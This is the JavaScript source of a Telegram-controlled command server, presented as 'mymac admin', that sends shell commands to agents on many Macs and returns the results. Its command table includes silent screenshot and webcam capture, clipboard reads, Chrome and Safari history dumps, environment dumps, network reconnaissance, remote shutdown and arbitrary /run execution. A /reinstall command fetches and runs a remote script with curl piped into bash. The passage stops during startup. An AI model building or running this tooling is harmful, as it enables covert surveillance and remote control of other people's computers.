require('dotenv').config();
const { Telegraf } = require('telegraf');
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { v4: uuidv4 } = require('uuid');

// ─── Config ───────────────────────────────────────────────────────────────────
const {
  TELEGRAM_TOKEN,    // From @BotFather
  ALLOWED_CHAT_ID,   // Your personal Telegram chat ID
  AGENT_SECRET,      // Shared secret with all Mac agents
  ADMIN_TOKEN,       // Shared secret with Vercel config server
  CONFIG_SERVER_URL, // e.g. https://mymac-config.vercel.app
  PORT = 3000,
} = process.env;

['TELEGRAM_TOKEN', 'ALLOWED_CHAT_ID', 'AGENT_SECRET', 'ADMIN_TOKEN', 'CONFIG_SERVER_URL']
  .forEach((name) => {
    if (!process.env[name]) { console.error(`Missing env var: ${name}`); process.exit(1); }
  });

// ─── State ────────────────────────────────────────────────────────────────────
// Per-device command queues:  deviceId → [{ id, cmd, chatId, requestedAt }]
const deviceQueues = {};
// Result store:  id → { output, exitCode, finishedAt }
const resultStore  = {};
// Known devices cache (refreshed from Vercel every 30 s or on demand)
let devicesCache   = [];
let devicesCacheAt = 0;

// ─── Helpers ──────────────────────────────────────────────────────────────────
function isAuthorized(ctx) {
  return String(ctx.chat.id) === String(ALLOWED_CHAT_ID);
}

function reply(chatId, text, extra = {}) {
  return bot.telegram.sendMessage(chatId, text, { parse_mode: 'Markdown', ...extra });
}

// ─── Vercel config-server helpers ─────────────────────────────────────────────
async function configReq(method, path, body) {
  const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
  const res = await (await fetch)(`${CONFIG_SERVER_URL}${path}`, {
    method,
    headers: { 'x-admin-token': ADMIN_TOKEN, 'Content-Type': 'application/json' },
    ...(body ? { body: JSON.stringify(body) } : {}),
  });
  return res.json();
}

async function getDevices(force = false) {
  if (!force && Date.now() - devicesCacheAt < 30_000 && devicesCache.length > 0) {
    return devicesCache;
  }
  const data = await configReq('GET', '/api/devices');
  devicesCache = data.devices ?? [];
  devicesCacheAt = Date.now();
  return devicesCache;
}

async function resolveDevice(query) {
  const devices = await getDevices(true);
  const q = query.toLowerCase();
  return devices.find(
    (d) => d.deviceId.toLowerCase().startsWith(q) || d.hostname.toLowerCase().startsWith(q)
  );
}

function onlineStatus(device) {
  const age = Date.now() - new Date(device.lastSeen).getTime();
  return age < 90_000 ? '🟢' : age < 300_000 ? '🟡' : '🔴';
}

// ─── Telegram Bot (Telegraf) ──────────────────────────────────────────────────
const bot = new Telegraf(TELEGRAM_TOKEN);

// /start
bot.command('start', (ctx) => {
  if (!isAuthorized(ctx)) return;
  console.log(`[cmd] /start from chatId=${ctx.chat.id}`);
  reply(ctx.chat.id,
    `*mymac admin*\n\nControl all your Macs remotely.\n\n` +
    `• \`/devices\` – list all Macs\n` +
    `• \`/run <cmd>\` – broadcast to all Macs\n` +
    `• \`/run @<hostname> <cmd>\` – specific Mac\n` +
    `• \`/screenshot\` \`/webcam\` \`/clip\` – recon\n` +
    `• \`/config\` – view server config\n` +
    `• \`/help\` – full command list`
  );
});

// /help
bot.command('help', (ctx) => {
  if (!isAuthorized(ctx)) return;
  console.log(`[cmd] /help from chatId=${ctx.chat.id}`);
  reply(ctx.chat.id,
    `*Commands*\n\n` +
    `*Run raw shell:*\n` +
    `\`/run <cmd>\` – broadcast to all Macs\n` +
    `\`/run @<hostname> <cmd>\` – target one Mac\n\n` +
    `*System info:*\n` +
    `\`/sysinfo\` – hardware & OS overview\n` +
    `\`/uptime\` – uptime & macOS version\n` +
    `\`/procs\` – top CPU processes\n` +
    `\`/disk\` – disk usage\n` +
    `\`/battery\` – battery status\n` +
    `\`/frontapp\` – currently focused app\n` +
    `\`/idle\` – seconds since last user input\n` +
    `\`/env\` – environment variables\n` +
    `\`/crontabs\` – scheduled cron jobs\n\n` +
    `*Screen & camera:*\n` +
    `\`/screenshot\` – silent screenshot (all Macs)\n` +
    `\`/webcam\` – silent webcam frame (all Macs)\n` +
    `\`/lock\` – lock screen\n` +
    `\`/sleep\` – sleep\n` +
    `\`/darkmode\` – toggle dark mode\n\n` +
    `*Clipboard:*\n` +
    `\`/clip\` – get clipboard contents\n\n` +
    `*Audio:*\n` +
    `\`/volume\` – get output volume\n` +
    `\`/mute\` – mute output\n` +
    `\`/unmute\` – unmute output\n\n` +
    `*Network:*\n` +
    `\`/netstat\` – established connections\n` +
    `\`/listening\` – listening ports\n` +
    `\`/wifi\` – current Wi-Fi info\n` +
    `\`/wifiscan\` – nearby networks\n` +
    `\`/publicip\` – public IP address\n` +
    `\`/arp\` – ARP table\n` +
    `\`/routes\` – routing table\n` +
    `\`/dns\` – DNS servers\n\n` +
    `*Files:*\n` +
    `\`/downloads\` – list ~/Downloads\n` +
    `\`/recentfiles\` – recently modified files\n\n` +
    `*Browser history:*\n` +
    `\`/chromehistory\` – last 20 Chrome URLs\n` +
    `\`/safarihistory\` – last 20 Safari URLs\n\n` +
    `*Security:*\n` +
    `\`/launchagents\` – persistence entries\n` +
    `\`/firewall\` – firewall status\n` +
    `\`/gatekeeper\` – Gatekeeper status\n` +
    `\`/sip\` – SIP status\n\n` +
    `*Power:*\n` +
    `\`/restart\` – restart\n` +
    `\`/shutdown\` – shutdown\n\n` +
    `*Sleep / wake:*\n` +
    `\`/powersettings\` – show all pmset settings\n` +
    `\`/lastwake\` – recent wake/sleep events\n` +
    `\`/wakeschedule\` – list scheduled wakes\n` +
    `\`/cancelwake\` – cancel all scheduled wakes\n` +
    `\`/enablepowernap\` – wake for network during sleep\n` +
    `\`/enablewol\` – enable Wake on LAN\n` +
    `\`/setwake [@host] MM/DD/YY HH:MM:SS\` – schedule one-time wake\n` +
    `\`/stayawake [@host] <seconds>\` – prevent sleep for N seconds\n\n` +
    `*Devices:*\n` +
    `\`/devices\` – list all Macs with status\n` +
    `\`/forget @<hostname>\` – remove a device\n\n` +
    `*Config (bot server):*\n` +
    `\`/config\` – show current config\n` +
    `\`/setserver <url>\` – update bot server URL\n` +
    `\`/setsecret <secret>\` – update agent secret\n\n` +
    `*Releases (agent self-update):*\n` +
    `\`/release\` – show published release\n` +
    `\`/setrelease <ver> <arm64-url> [amd64-url] [arm64-sha256] [amd64-sha256]\`\n` +
    `\`/update [@hostname]\` – force immediate update check\n` +
    `\`/reinstall [@hostname] <gh-token>\` – full fresh reinstall of daemon\n\n` +
    `*Queue:*\n` +
    `\`/status\` – pending command counts\n` +
    `\`/clear\` – clear all queues`
  );
});

// /devices
bot.command('devices', async (ctx) => {
  if (!isAuthorized(ctx)) return;
  console.log(`[cmd] /devices from chatId=${ctx.chat.id}`);
  const chatId = ctx.chat.id;
  try {
    const devices = await getDevices(true);
    if (!devices.length) return reply(chatId, 'No devices registered yet.');
    const lines = devices.map((d) => {
      const q = (deviceQueues[d.deviceId] ?? []).length;
      const last = new Date(d.lastSeen).toLocaleString();
      return (
        `${onlineStatus(d)} *${d.hostname}* (${d.arch})\n` +
        `  ID: \`${d.deviceId.slice(0, 8)}\`  Queue: ${q}  Last seen: ${last}`
      );
    });
    reply(chatId, `*Registered Macs (${devices.length}):*\n\n${lines.join('\n\n')}`);
  } catch (e) {
    reply(chatId, `Error: ${e.message}`);
  }
});

// /forget @hostname
bot.hears(/^\/forget @?(\S+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const match = ctx.match;
  console.log(`[cmd] /forget target=${match[1]} from chatId=${ctx.chat.id}`);
  const device = await resolveDevice(match[1].trim());
  if (!device) return reply(ctx.chat.id, `Device \`${match[1]}\` not found.`);
  await configReq('POST', '/api/devices/remove', { deviceId: device.deviceId });
  delete deviceQueues[device.deviceId];
  await getDevices(true);
  reply(ctx.chat.id, `✅ Removed: *${device.hostname}*`);
});

// /config
bot.command('config', async (ctx) => {
  if (!isAuthorized(ctx)) return;
  console.log(`[cmd] /config from chatId=${ctx.chat.id}`);
  try {
    const cfg = await configReq('GET', '/api/config');
    reply(ctx.chat.id,
      `*Server config* (v${cfg.version ?? '?'})\n` +
      `URL: \`${cfg.serverUrl || '(not set)'}\`\n` +
      `Secret: \`${cfg.agentSecret ? cfg.agentSecret.slice(0, 8) + '…' : '(not set)'}\`\n` +
      `Updated: ${cfg.updatedAt ?? 'never'}\n\n` +
      `Use /setserver and /setsecret to change.`
    );
  } catch (e) {
    reply(ctx.chat.id, `Error: ${e.message}`);
  }
});

// /setserver <url>
bot.hears(/^\/setserver (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const url = ctx.match[1].trim().replace(/\/$/, '');
  console.log(`[cmd] /setserver url=${url} from chatId=${ctx.chat.id}`);
  try {
    await configReq('POST', '/api/config', { serverUrl: url });
    reply(ctx.chat.id,
      `✅ Server URL updated:\n\`${url}\`\n\n` +
      `All agents will reconnect within ~5 min on their next config poll.`
    );
  } catch (e) {
    reply(ctx.chat.id, `Error: ${e.message}`);
  }
});

// /setrelease <version> <arm64-url> [amd64-url] [arm64-sha256] [amd64-sha256]
bot.hears(/^\/setrelease (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const parts = ctx.match[1].trim().split(/\s+/);
  const [version, arm64Url, amd64Url, arm64Sha256, amd64Sha256] = parts;
  if (!version || !arm64Url) {
    return reply(ctx.chat.id,
      'Usage: `/setrelease <version> <arm64-url> [amd64-url] [arm64-sha256] [amd64-sha256]`'
    );
  }
  try {
    await configReq('POST', '/api/release', {
      version,
      arm64Url,
      ...(amd64Url    ? { amd64Url }    : {}),
      ...(arm64Sha256 ? { arm64Sha256 } : {}),
      ...(amd64Sha256 ? { amd64Sha256 } : {}),
    });
    const shaNote = arm64Sha256 ? `\narm64 sha256: \`${arm64Sha256.slice(0, 12)}…\`` : ' _(no checksum — less secure)_';
    reply(ctx.chat.id,
      `✅ Release published: \`${version}\`\n` +
      `arm64: \`${arm64Url}\`${shaNote}\n\n` +
      `Agents will update within ~1 hour, or immediately via /update.`
    );
  } catch (e) {
    reply(ctx.chat.id, `Error: ${e.message}`);
  }
});

// /update [@hostname] – force immediate update check on one or all agents
bot.hears(/^\/update(?: @?([\w.-]+))?$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const chatId = ctx.chat.id;
  const cmd = '__update__';
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
    reply(chatId, `🔄 Update check triggered on *${device.hostname}*.`);
  } else {
    const devices = await getDevices();
    if (!devices.length) return reply(chatId, 'No devices registered yet.');
    for (const d of devices) enqueue(chatId, d.deviceId, d.hostname, cmd);
    reply(chatId, `🔄 Update check triggered on *${devices.length}* Mac(s).`);
  }
});

// /release – show current published release
bot.command('release', async (ctx) => {
  if (!isAuthorized(ctx)) return;
  try {
    const rel = await configReq('GET', '/api/release');
    if (!rel.version) return reply(ctx.chat.id, 'No release published yet. Use /setrelease.');
    reply(ctx.chat.id,
      `*Current release:* \`${rel.version}\`\n` +
      `arm64: \`${rel.arm64Url || '(not set)'}\`\n` +
      `amd64: \`${rel.amd64Url || '(not set)'}\`\n` +
      `Published: ${rel.publishedAt ?? 'unknown'}`
    );
  } catch (e) {
    reply(ctx.chat.id, `Error: ${e.message}`);
  }
});

// /setsecret <secret>
bot.hears(/^\/setsecret (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const secret = ctx.match[1].trim();
  console.log(`[cmd] /setsecret secret=****${secret.slice(-4)} from chatId=${ctx.chat.id}`);
  try {
    await configReq('POST', '/api/config', { agentSecret: secret });
    process.env.AGENT_SECRET = secret; // update in-memory immediately
    reply(ctx.chat.id,
      `✅ Agent secret updated in Firebase and applied immediately.\n\n` +
      `Agents will pick up the new secret within ~5 min on their next config poll.`
    );
  } catch (e) {
    reply(ctx.chat.id, `Error: ${e.message}`);
  }
});

// /status
bot.command('status', async (ctx) => {
  if (!isAuthorized(ctx)) return;
  console.log(`[cmd] /status from chatId=${ctx.chat.id}`);
  const devices = await getDevices();
  const lines = devices.map(
    (d) => `${onlineStatus(d)} *${d.hostname}*: ${(deviceQueues[d.deviceId] ?? []).length} pending`
  );
  reply(ctx.chat.id,
    `*Queue status*\n${lines.join('\n') || 'No devices'}\n\nResults buffered: ${Object.keys(resultStore).length}`
  );
});

// /clear
bot.command('clear', (ctx) => {
  if (!isAuthorized(ctx)) return;
  console.log(`[cmd] /clear from chatId=${ctx.chat.id}`);
  Object.keys(deviceQueues).forEach((k) => { deviceQueues[k] = []; });
  reply(ctx.chat.id, '✅ All queues cleared.');
});

// ── Built-in shortcut commands (broadcast to all) ─────────────────────────────
const SHORTCUTS = {
  // System info
  '/sysinfo':       { cmd: 'system_profiler SPHardwareDataType SPSoftwareDataType 2>/dev/null' },
  '/uptime':        { cmd: 'uptime && sw_vers' },
  '/procs':         { cmd: 'ps aux | sort -rk 3 | head -21' },
  '/disk':          { cmd: 'df -h' },
  '/battery':       { cmd: 'pmset -g batt' },
  '/frontapp':      { cmd: `osascript -e 'tell application "System Events" to get name of first application process whose frontmost is true'` },
  '/idle':          { cmd: `ioreg -c IOHIDSystem | awk '/HIDIdleTime/ {print int($NF/1000000000)" seconds idle"; exit}'` },
  '/env':           { cmd: 'printenv | sort' },
  '/crontabs':      { cmd: 'crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null' },

  // Screen & camera
  '/screenshot':    { cmd: 'CU=$(stat -f \'%Su\' /dev/console); sudo -u "$CU" screencapture -x /tmp/_sc.png && base64 /tmp/_sc.png && rm -f /tmp/_sc.png', type: 'screenshot', ext: 'png' },
  '/webcam':        { cmd: 'CU=$(stat -f \'%Su\' /dev/console); sudo -u "$CU" ffmpeg -f avfoundation -video_size 1280x720 -framerate 30 -i "0" -frames:v 1 -y /tmp/_wc.jpg 2>/dev/null && base64 /tmp/_wc.jpg && rm -f /tmp/_wc.jpg', type: 'screenshot', ext: 'jpg' },
  '/lock':          { cmd: `osascript -e 'tell application "System Events" to keystroke "q" using {command down, control down}'` },
  '/sleep':         { cmd: 'pmset sleepnow' },
  '/darkmode':      { cmd: `osascript -e 'tell app "System Events" to tell appearance preferences to set dark mode to not dark mode'` },

  // Clipboard
  '/clip':          { cmd: 'pbpaste' },

  // Audio
  '/volume':        { cmd: `osascript -e 'output volume of (get volume settings)'` },
  '/mute':          { cmd: `osascript -e 'set volume with output muted'` },
  '/unmute':        { cmd: `osascript -e 'set volume without output muted'` },

  // Network
  '/netstat':       { cmd: 'lsof -i -n -P | grep ESTABLISHED' },
  '/listening':     { cmd: 'lsof -iTCP -sTCP:LISTEN -n -P' },
  '/wifi':          { cmd: '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I' },
  '/wifiscan':      { cmd: '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s' },
  '/publicip':      { cmd: 'curl -s https://api.ipify.org' },
  '/arp':           { cmd: 'arp -a' },
  '/routes':        { cmd: 'netstat -rn' },
  '/dns':           { cmd: 'scutil --dns | grep nameserver | sort -u' },

  // Files
  '/downloads':     { cmd: 'ls -lah ~/Downloads/ | head -40' },
  '/recentfiles':   { cmd: `find ~ -not -path '*/.*' -maxdepth 5 -type f -newer /tmp 2>/dev/null | head -25` },

  // Browser history
  '/chromehistory': { cmd: `sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/History 'SELECT datetime(last_visit_time/1000000-11644473600,"unixepoch","localtime"),title,url FROM urls ORDER BY last_visit_time DESC LIMIT 20;' 2>/dev/null` },
  '/safarihistory': { cmd: `sqlite3 ~/Library/Safari/History.db 'SELECT datetime(visit_time+978307200,"unixepoch","localtime"),title,url FROM history_items JOIN history_visits ON history_items.id=history_visits.history_item ORDER BY visit_time DESC LIMIT 20;' 2>/dev/null` },

  // Security / persistence
  '/launchagents':  { cmd: 'ls -la ~/Library/LaunchAgents/ 2>/dev/null; ls -la /Library/LaunchAgents/ 2>/dev/null; ls -la /Library/LaunchDaemons/ 2>/dev/null' },
  '/firewall':      { cmd: '/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate' },
  '/gatekeeper':    { cmd: 'spctl --status' },
  '/sip':           { cmd: 'csrutil status' },

  // Power
  '/restart':       { cmd: 'shutdown -r now' },
  '/shutdown':      { cmd: 'shutdown -h now' },

  // Sleep / wake persistence
  '/powersettings': { cmd: 'pmset -g' },
  '/lastwake':      { cmd: 'pmset -g log | grep -E "Wake|Sleep" | tail -20' },
  '/wakeschedule':  { cmd: 'pmset -g sched' },
  '/cancelwake':    { cmd: 'pmset schedule cancelall' },
  '/enablepowernap':{ cmd: 'pmset -a powernap 1' },
  '/enablewol':     { cmd: 'pmset -a womp 1' },
};

Object.entries(SHORTCUTS).forEach(([trigger, { cmd, type, ext }]) => {
  bot.hears(new RegExp(`^\\${trigger}$`), async (ctx) => {
    if (!isAuthorized(ctx)) return;
    console.log(`[cmd] ${trigger} type=${type ?? 'text'} from chatId=${ctx.chat.id}`);
    await broadcast(ctx.chat.id, cmd, trigger, type, ext);
  });
});

// /reinstall [@hostname] <gh-token>  – fresh reinstall of the agent daemon
bot.hears(/^\/reinstall(?: @?([\w.-]+))? (\S+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target  = ctx.match[1];
  const ghToken = ctx.match[2].trim();
  const chatId  = ctx.chat.id;
  // Downloads install.sh from the private repo using the token, then runs it
  // non-interactively (GH_TOKEN in env skips the interactive prompt).
  const cmd = [
    `curl -fsSL`,
    `-H "Authorization: token ${ghToken}"`,
    `https://raw.githubusercontent.com/chocolaid/mymac/main/install.sh`,
    `| GH_TOKEN=${ghToken} bash`,
  ].join(' ');
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    reply(chatId, `🔄 Reinstalling agent on *${device.hostname}*…`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    const devices = await getDevices();
    if (!devices.length) return reply(chatId, 'No devices registered yet.');
    reply(chatId, `🔄 Reinstalling agent on *${devices.length}* Mac(s)…`);
    for (const d of devices) enqueue(chatId, d.deviceId, d.hostname, cmd);
  }
});

// /setwake [@hostname] MM/DD/YY HH:MM:SS  – schedule a one-time wake
bot.hears(/^\/setwake(?: @?([\w.-]+))? (\d{2}\/\d{2}\/\d{2} \d{2}:\d{2}:\d{2})$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target   = ctx.match[1];
  const dateStr  = ctx.match[2].trim();
  const cmd      = `pmset schedule wakeorpoweron "${dateStr}"`;
  const chatId   = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/setwake ${dateStr}`);
  }
});

// /stayawake [@hostname] <seconds>  – caffeinate for N seconds
bot.hears(/^\/stayawake(?: @?([\w.-]+))?(?: (\d+))?$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const secs   = parseInt(ctx.match[2] ?? '3600');
  const cmd    = `caffeinate -t ${secs} &`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/stayawake ${secs}s`);
  }
});

// /run [@hostname] <cmd>
bot.hears(/^\/run(?: @([\w.-]+))? ([\s\S]+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const cmd    = ctx.match[2].trim();
  const chatId = ctx.chat.id;
  console.log(`[cmd] /run target=${target ?? 'all'} cmd="${cmd.slice(0, 80)}" from chatId=${chatId}`);
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, cmd);
  }
});

// ─── Core: enqueue + broadcast ────────────────────────────────────────────────
async function broadcast(chatId, cmd, label, type, ext) {
  const devices = await getDevices();
  if (!devices.length) return reply(chatId, 'No devices registered yet.');
  console.log(`[broadcast] cmd="${label}" type=${type ?? 'text'} targets=${devices.map(d => d.hostname).join(', ')}`);
  reply(chatId, `📡 Broadcasting to *${devices.length}* Mac(s):\n\`\`\`\n${label}\n\`\`\``);
  for (const d of devices) enqueue(chatId, d.deviceId, d.hostname, cmd, type, ext);
}

function enqueue(chatId, deviceId, hostname, cmd, type, ext) {
  const id = uuidv4();
  if (!deviceQueues[deviceId]) deviceQueues[deviceId] = [];
  deviceQueues[deviceId].push({ id, cmd, chatId, requestedAt: Date.now() });
  const qLen = deviceQueues[deviceId].length;
  console.log(`[enqueue] id=${id.slice(0,8)} host=${hostname} type=${type ?? 'text'} ext=${ext ?? 'n/a'} queueLen=${qLen} cmd="${cmd.slice(0, 80)}${cmd.length > 80 ? '…' : ''}"`);
  waitForResult(id, chatId, hostname, cmd, type, ext);
}

function waitForResult(id, chatId, hostname, cmd, type, ext, deadline = Date.now() + 90_000) {
  console.log(`[wait] id=${id.slice(0,8)} host=${hostname} type=${type ?? 'text'} ext=${ext ?? 'n/a'} timeout=${Math.round((deadline - Date.now()) / 1000)}s`);
  const tick = () => {
    if (resultStore[id]) {
      const { output, exitCode } = resultStore[id];
      delete resultStore[id];
      console.log(`[result] id=${id.slice(0,8)} host=${hostname} exit=${exitCode} outputBytes=${output.length}`);

      if (type === 'screenshot' && exitCode === 0 && output.trim().length > 0) {
        // Strip everything that is not a valid base64 character (A-Z a-z 0-9 + / =).
        // A plain \s strip leaves behind any non-printable / non-ASCII bytes that
        // Buffer.from silently discards, producing a truncated corrupt JPEG.
        const b64raw = output.replace(/[^A-Za-z0-9+/=]/g, '');
        // Re-pad to a multiple of 4.
        const b64 = b64raw + '='.repeat((4 - (b64raw.length % 4)) % 4);
        const buf = Buffer.from(b64, 'base64');

        // Validate image magic bytes: JPEG = FF D8 FF, PNG = 89 50 4E 47
        const magic   = buf.slice(0, 4).toString('hex');
        const tail    = buf.slice(-4).toString('hex');
        const isJpeg  = buf[0] === 0xff && buf[1] === 0xd8 && buf[2] === 0xff;
        const isPng   = buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4e && buf[3] === 0x47;
        const isValid = isJpeg || isPng;
        const filename = `screenshot.${ext ?? (isPng ? 'png' : 'jpg')}`;
        console.log(
          `[screenshot] id=${id.slice(0,8)} host=${hostname}` +
          ` b64Raw=${b64raw.length} b64Padded=${b64.length} bufBytes=${buf.length}` +
          ` magic=${magic} tail=${tail} validImage=${isValid} (jpeg=${isJpeg} png=${isPng}) filename=${filename} chatId=${chatId}`
        );

        if (!isValid) {
          console.error(`[screenshot] id=${id.slice(0,8)} host=${hostname} — INVALID image header (${magic}), aborting`);
          reply(chatId, `📋 *${hostname}* — screenshot decode failed: unrecognised header \`${magic}\` (bufBytes=${buf.length})`);
          return;
        }

        // sendPhoto lets Telegram process the image; if it rejects (IMAGE_PROCESS_FAILED),
        // fall back to sendDocument which delivers the raw file without processing.
        const sendAsPhoto = () => bot.telegram.sendPhoto(
          chatId,
          { source: Buffer.from(buf), filename },
          { caption: `📸 *${hostname}*`, parse_mode: 'Markdown' },
        );

        const sendAsDocument = (reason) => {
          console.warn(`[screenshot] id=${id.slice(0,8)} host=${hostname} — falling back to sendDocument (reason: ${reason})`);
          return bot.telegram.sendDocument(
            chatId,
            { source: Buffer.from(buf), filename },
            { caption: `📸 *${hostname}* (sent as file — ${reason})`, parse_mode: 'Markdown' },
          );
        };

        sendAsPhoto()
          .then(() => console.log(`[screenshot] id=${id.slice(0,8)} host=${hostname} — sendPhoto OK`))
          .catch((err) => {
            const tgCode = err.response?.error_code  ?? 'n/a';
            const tgDesc = err.response?.description ?? 'n/a';
            console.error(
              `[screenshot] id=${id.slice(0,8)} host=${hostname} — sendPhoto FAILED\n` +
              `  message:    ${err.message}\n` +
              `  tg_code:    ${tgCode}\n` +
              `  tg_desc:    ${tgDesc}\n` +
              `  buf_bytes:  ${buf.length}\n` +
              `  b64_padded: ${b64.length}\n` +
              `  b64_raw:    ${b64raw.length}\n` +
              `  magic:      ${magic}  tail: ${tail}\n` +
              `  filename:   ${filename}\n` +
              `  stack:\n${err.stack}`
            );
            if (tgDesc.includes('IMAGE_PROCESS_FAILED') || tgCode === 400) {
              sendAsDocument(`tg: ${tgDesc}`)
                .then(() => console.log(`[screenshot] id=${id.slice(0,8)} host=${hostname} — sendDocument fallback OK`))
                .catch((e2) => {
                  console.error(`[screenshot] id=${id.slice(0,8)} host=${hostname} — sendDocument fallback FAILED: ${e2.message}`);
                  reply(chatId, `📋 *${hostname}* — screenshot failed (photo + document both failed)\n\`${tgCode}: ${tgDesc}\`\nbuf: ${buf.length} bytes`);
                });
            } else {
              reply(chatId, `📋 *${hostname}* — screenshot failed\n\`tg_code ${tgCode}: ${tgDesc}\`\nbuf: ${buf.length} bytes`);
            }
          });
        return;
      }

      const text = output.length > 3500
        ? output.slice(0, 3500) + '\n…(truncated)'
        : output || '(no output)';
      console.log(`[reply] id=${id.slice(0,8)} host=${hostname} exit=${exitCode} textLen=${text.length}`);
      reply(chatId, `📋 *${hostname}* \\(exit ${exitCode}\\)\n\`\`\`\n${text}\n\`\`\``);
      return;
    }
    if (Date.now() > deadline) {
      console.warn(`[timeout] id=${id.slice(0,8)} host=${hostname} cmd="${cmd.slice(0, 60)}"`);
      reply(chatId, `⏰ *${hostname}* — no response for: \`${cmd.slice(0, 60)}\``);
      return;
    }
    setTimeout(tick, 1500);
  };
  setTimeout(tick, 1500);
}

// ─── Config sync (keeps AGENT_SECRET in sync with Firebase) ──────────────────
// After the Firebase migration the .env value and the Firebase value can drift.
// We fix this by fetching the canonical secret from the config server on startup
// and then refreshing it every 5 minutes so /setsecret changes propagate here
// automatically without needing a bot restart.
let _configSyncVersion = -1;

async function syncConfigFromServer() {
  try {
    const cfg = await configReq('GET', '/api/config');
    if (cfg.agentSecret && cfg.agentSecret !== process.env.AGENT_SECRET) {
      process.env.AGENT_SECRET = cfg.agentSecret;
      console.log(`[bot] AGENT_SECRET synced from config server (config v${cfg.version ?? '?'}).`);
    }
    _configSyncVersion = cfg.version ?? _configSyncVersion;
  } catch (e) {
    console.error('[bot] Failed to sync config from server:', e.message);
  }
}

// ─── Express REST API (Mac agents connect here) ───────────────────────────────
const app = express();
app.set('trust proxy', 1); // required when behind localtunnel / reverse proxy
app.use(helmet());
app.use(express.json({ limit: '20mb' }));
app.use('/api', rateLimit({ windowMs: 10_000, max: 60 }));

// Agent auth — reads process.env.AGENT_SECRET which is kept fresh by syncConfigFromServer()
app.use('/api', (req, res, next) => {
  if (req.headers['x-agent-secret'] !== process.env.AGENT_SECRET) {
    console.warn(`[auth] REJECTED ${req.method} ${req.path} from ${req.ip} — bad secret`);
    return res.status(401).json({ error: 'unauthorized' });
  }
  next();
});

// GET /api/command?device=<deviceId>
app.get('/api/command', (req, res) => {
  const { device } = req.query;
  if (!device) return res.status(400).json({ error: 'device query param required' });
  const queue = deviceQueues[device] ?? [];
  if (!queue.length) return res.status(204).end();
  const item = queue.shift();
  console.log(`[dispatch] id=${item.id.slice(0,8)} device=${device.slice(0,8)} cmd="${item.cmd.slice(0, 80)}${item.cmd.length > 80 ? '…' : ''}" remainingQueue=${queue.length}`);
  res.json(item);
});

// POST /api/result  { id, deviceId, hostname, output, exitCode }
app.post('/api/result', (req, res) => {
  const { id, output, exitCode, hostname, deviceId } = req.body;
  if (!id) return res.status(400).json({ error: 'id required' });
  const outStr = String(output ?? '');
  const claimedLen = req.headers['content-length'] ?? '?';
  console.log(`[api/result] id=${id.slice(0,8)} host=${hostname ?? '?'} device=${(deviceId ?? '?').slice(0,8)} exit=${exitCode} outputBytes=${outStr.length} content-length=${claimedLen}`);
  resultStore[id] = { output: outStr, exitCode: Number(exitCode ?? -1), finishedAt: Date.now() };
  res.json({ ok: true });
});

// POST /api/alert  { deviceId, hostname, message }
app.post('/api/alert', (req, res) => {
  const { hostname, message } = req.body ?? {};
  if (!message) return res.status(400).json({ error: 'message required' });
  console.log(`[api/alert] host=${hostname ?? '?'} message="${message.slice(0, 100)}"`);
  bot.telegram.sendMessage(ALLOWED_CHAT_ID, `🔔 *Alert from ${hostname ?? 'Mac'}*\n${message}`, { parse_mode: 'Markdown' });
  res.json({ ok: true });
});

// GET /health
app.get('/health', (_req, res) => res.json({ ok: true, uptime: process.uptime() }));

// ─── Express error handler (catches body-too-large, JSON parse failures, etc.) ─
// eslint-disable-next-line no-unused-vars
app.use((err, req, res, next) => {
  const status = err.status ?? err.statusCode ?? 500;
  console.error(
    `[express-error] ${req.method} ${req.path} → ${status}\n` +
    `  type:     ${err.type ?? 'n/a'}\n` +
    `  message:  ${err.message}\n` +
    `  content-length: ${req.headers['content-length'] ?? '?'}\n` +
    `  ip:       ${req.ip}\n` +
    (status === 413 ? '  *** Body too large — increase express.json limit or nginx client_max_body_size ***\n' : '') +
    `  stack:\n${err.stack}`
  );
  res.status(status).json({ error: err.message ?? 'internal error' });
});

// ─── Startup ──────────────────────────────────────────────────────────────────
(async () => {
  // Pull the canonical agentSecret from Firebase before accepting connections.
  // This fixes the post-Firebase-migration gap where the .env value lags behind.
  console.log('[bot] Syncing config from server before startup...');
  await syncConfigFromServer();

  if (!process.env.AGENT_SECRET) {
    console.error('[bot] AGENT_SECRET is still empty after sync — agents will not be able to authenticate. Set it with /setsecret.');
  }

  // Keep re-syncing every 5 min so /setsecret changes propagate without a restart.
  setInterval(syncConfigFromServer, 5 * 60 * 1000);

  app.listen(PORT, () => {
    console.log(`[bot] Listening on :${PORT}`);
